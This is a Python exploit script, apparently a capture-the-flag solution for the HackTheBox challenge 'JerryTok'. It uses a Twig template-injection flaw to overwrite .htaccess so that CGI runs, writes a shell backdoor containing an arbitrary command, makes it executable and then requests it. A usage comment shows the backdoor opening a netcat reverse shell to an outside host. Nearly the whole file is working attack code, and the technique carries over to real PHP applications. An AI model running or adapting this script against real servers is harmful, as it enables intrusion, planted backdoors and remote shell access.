"""
    Exploit execution sample: 
    python3 cgi-backdoor.py --url http://94.237.63.93:33789 --command "nc <rev_shell_ip> <rev_shell_port> -e /bin/sh" 
"""

import requests
import urllib.parse
import argparse

def exploit_ssti(payload):
    ssti_url = url + "?location={}"
    return requests.get(
        ssti_url.format(payload ),
        proxies={
            # 'http': 'http://127.0.0.1:8080',
            # 'https': 'https://127.0.0.1:8080',
        }
    )


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
                prog='mb_send_mail_xpl',
                description='Exploit solution for HTB challenge JerryTok',
                epilog='')
    parser.add_argument('-u', '--url', default='http://127.0.0.1:1337', help='Target URL.')
    parser.add_argument('-c','--command', default='id', help='Command to execute on target.')
    args = parser.parse_args()
    url = args.url
    command = args.command

    ##### Step 1: Overwrite .htaccess to enable CGI Execution
    htaccess = """Options +ExecCGI\nAddHandler cgi-script .nriver\n"""
    payload = "{{['/www/public/.htaccess',\""+htaccess+"\"]|sort('file_put_contents')}}"
    exploit_ssti(payload)

    #### Step 2: Write CGI Backdoor
    # cgi_backdoor = "#!/bin/sh\n\necho&&echo ID:;id;echo FLAG;/readflag"
    cgi_backdoor = urllib.parse.quote("#!/bin/sh\n\necho&&%s" % command)
    payload = "{{['/www/public/shell.nriver',\"%s\"]|sort('file_put_contents')}}" % cgi_backdoor
    exploit_ssti(payload)

    #### Step 3: Chmod +x CGI 
    #### <?php
    #### $mode = 777;
    #### echo octdec($mode) --> 511;
    payload = "{{['/www/public/shell.nriver',511]|sort('chmod')}}"
    exploit_ssti(payload)

    #### Step 4: Get Flag
    response = requests.get("{}/shell.nriver".format(url))
    print(response.text)